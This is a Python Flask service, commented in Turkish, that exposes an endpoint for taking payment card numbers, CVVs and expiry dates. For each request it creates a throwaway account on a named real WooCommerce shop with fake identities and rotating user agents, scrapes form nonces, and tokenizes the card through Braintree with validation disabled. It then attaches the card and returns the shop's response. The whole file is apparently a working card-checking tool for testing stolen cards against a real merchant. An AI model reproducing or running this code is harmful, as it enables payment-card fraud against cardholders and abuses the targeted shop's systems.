import os
import re
import base64
import json
import requests
from flask import Flask, request, jsonify
from user_agent import generate_user_agent
from faker import Faker

app = Flask(__name__)

@app.route('/tokenize', methods=['GET', 'POST'])
def tokenize_payment():
    # 1. PARAMETRE KONTROLÜ
    if request.is_json:
        input_data = request.json
    else:
        input_data = request.args.to_dict()

    required_params = ['number', 'cvv', 'exp_month', 'exp_year']
    if not input_data or not all(k in input_data for k in required_params):
        return jsonify({
            "status": "error", 
            "message": "Eksik parametre! Örn: /tokenize?number=...&cvv=...&exp_month=...&exp_year=..."
        }), 400

    # 2. SESSİON VE KİMLİK AYARLARI
    f = Faker()
    e = f.email()
    n = f.name()
    u = generate_user_agent()
    r = requests.Session()

    try:
        # --- ADIM 1: WOOCOMMERCE HESAP SAYFASI & NONCE ---
        response = r.get('https://www.dnalasering.com/my-account/', headers={'User-Agent': u}, timeout=15)
        x = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', response.text)
        xp = x.group(1) if x else ''

        register_data = {
            'email': e,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_user_agent': u,
            'woocommerce-register-nonce': xp,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }

        r.post('https://www.dnalasering.com/my-account/', headers={
            'authority': 'www.dnalasering.com',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.dnalasering.com',
            'referer': 'https://www.dnalasering.com/my-account/',
            'user-agent': u,
        }, data=register_data, timeout=15)

        # --- ADIM 2: ADRES GÜNCELLEME ---
        response = r.get('https://www.dnalasering.com/my-account/edit-address/billing/', headers={'User-Agent': u}, timeout=15)
        xxl = re.search(r'name="woocommerce-edit-address-nonce" value="([^"]+)"', response.text)
        xxp = xxl.group(1) if xxl else ''

        address_data = {
            'billing_first_name': n,
            'billing_last_name': n,
            'billing_country': 'US',
            'billing_address_1': 'Hollow park city 49',
            'billing_city': 'New york',
            'billing_state': 'NY',
            'billing_postcode': '10080',
            'billing_phone': '3164394561',
            'billing_email': e,
            'save_address': 'Save address',
            'woocommerce-edit-address-nonce': xxp,
            '_wp_http_referer': '/my-account/edit-address/billing/',
            'action': 'edit_address',
        }

        r.post('https://www.dnalasering.com/my-account/edit-address/billing/', cookies=r.cookies, headers={
            'authority': 'www.dnalasering.com',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.dnalasering.com',
            'referer': 'https://www.dnalasering.com/my-account/edit-address/billing/',
            'user-agent': u,
        }, data=address_data, timeout=15)

        # --- ADIM 3: AJAX NONCE VE CLIENT TOKEN ALMA ---
        site = r.get('https://www.dnalasering.com/my-account/add-payment-method/', headers={'User-Agent': u}, timeout=15)
        xox = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', site.text)
        xoxp = xox.group(1) if xox else ''

        wwp = re.search(r'client_token_nonce":"([^"]+)"', site.text)
        if not wwp:
            wwp = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)\\u0022', site.text)
        xpython = wwp.group(1) if wwp else ''

        if not xpython:
            return jsonify({"status": "error", "message": "Sayfadan client_token_nonce değeri ayıklanamadı. Site mimarisi değişmiş veya bot engeli olabilir."}), 500

        ajax_data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': xpython,
        }
        ajax_resp = r.post('https://www.dnalasering.com/wp-admin/admin-ajax.php', headers={
            'User-Agent': u,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.dnalasering.com',
            'Referer': 'https://www.dnalasering.com/my-account/add-payment-method/',
        }, data=ajax_data, timeout=15)

        # JSON Çözümleme Hatasını Engelleme Kontrolü
        if ajax_resp.status_code != 200:
            return jsonify({
                "status": "error", 
                "message": f"Admin-ajax isteği başarısız oldu. Durum Kodu: {ajax_resp.status_code}",
                "html_preview": ajax_resp.text[:300]
            }), 400

        try:
            ajax_json = ajax_resp.json()
        except json.JSONDecodeError:
            return jsonify({
                "status": "error",
                "message": "Hedef sunucu JSON yerine geçersiz veri döndü (Büyük ihtimalle Cloudflare/WAF engeli).",
                "response_text": ajax_resp.text[:500]
            }), 500

        if 'data' not in ajax_json:
            return jsonify({"status": "error", "message": "Admin-ajax yanıtı 'data' anahtarını içermiyor.", "details": ajax_json}), 500

        decoded = base64.b64decode(ajax_json['data']).decode('utf-8')
        auth_fingerprint = json.loads(decoded).get('authorizationFingerprint')

        # --- ADIM 4: BRAINTREE GRAPHQL TOKENİZASYON ---
        json_graphql = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom'},
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': str(input_data['number']).strip(),
                        'expirationMonth': str(input_data['exp_month']).strip(),
                        'expirationYear': str(input_data['exp_year']).strip(),
                        'cvv': str(input_data['cvv']).strip(),
                    },
                    'options': {'validate': False},
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response_graphql = r.post('https://payments.braintree-api.com/graphql', headers={
            'authority': 'payments.braintree-api.com',
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': u,
        }, json=json_graphql, timeout=15)

        try:
            graphql_data = response_graphql.json()
        except json.JSONDecodeError:
            return jsonify({"status": "error", "message": "Braintree GraphQL geçersiz yanıt döndü.", "response_text": response_graphql.text[:300]}), 500

        if 'errors' in graphql_data:
            return jsonify({"status": "error", "message": "Braintree GraphQL hatası.", "details": graphql_data['errors']}), 400
            
        braintree_token = graphql_data['data']['tokenizeCreditCard']['token']

        # --- ADIM 5: METODU HESABA EKLEME ---
        final_data = [
            ('payment_method', 'braintree_credit_card'),
            ('wc-braintree-credit-card-card-type', 'visa'),
            ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
            ('wc_braintree_credit_card_payment_nonce', braintree_token),
            ('wc_braintree_device_data', '{}'),
            ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
            ('woocommerce-add-payment-method-nonce', xoxp),
            ('_wp_http_referer', '/my-account/add-payment-method/'),
            ('woocommerce_add_payment_method', '1'),
        ]

        response_final = r.post('https://www.dnalasering.com/my-account/add-payment-method/', cookies=r.cookies, headers={
            'authority': 'www.dnalasering.com',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.dnalasering.com',
            'referer': 'https://www.dnalasering.com/my-account/add-payment-method/',
            'user-agent': u,
        }, data=final_data, timeout=15)

        # Sonuç yakalama
        wx = re.search(r'<ul class="woocommerce-error"[^>]*>(.*?)</ul>', response_final.text, re.DOTALL)
        if wx:
            msg = re.sub(r'<[^>]+>', '', wx.group(1)).strip()
        else:
            msg = "İşlem tamamlandı veya doğrudan bir hata listelenmedi."

        return jsonify({
            "status": "success",
            "gateway": "Braintree Custom Integration",
            "token": braintree_token,
            "response": msg
        })

    except requests.exceptions.Timeout:
        return jsonify({"status": "error", "message": "Hedef site zaman aşımına uğradı (Timeout)."}), 504
    except Exception as err:
        return jsonify({"status": "error", "message": f"Sistemsel Hata: {str(err)}"}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
